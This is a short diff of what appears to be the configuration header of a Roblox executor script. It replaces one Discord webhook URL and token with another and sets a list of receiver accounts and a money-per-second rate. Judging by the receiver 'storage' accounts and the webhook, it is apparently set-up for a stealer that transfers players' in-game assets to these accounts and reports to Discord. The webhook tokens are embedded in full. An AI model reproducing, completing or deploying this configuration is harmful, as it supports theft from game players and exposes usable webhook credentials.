@@ -1,4 +1,4 @@
-getgenv().WEBHOOK = "https://discord.com/api/webhooks/1432619016249409737/bkdA3oRZBQuXeL-DJhV-3Qqc6SZAULmLTPuyHk_r5zZTyiSFK64efUcODV_Wqe71KW-P"
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1432685482147581964/he24ZPrGmG1ZotrzeIfXydL239FVjucyIr_guJZKDNOm9o8KGosccWLqh-1doI6SiieA"
 getgenv().RECEIVERS = {"devrepay", "GAGRICHKID_0", "wextonstorage1", "Wextonstorage2",
 "wextonstorage3", "okinawa_tyd", "malcomgay"}
 getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
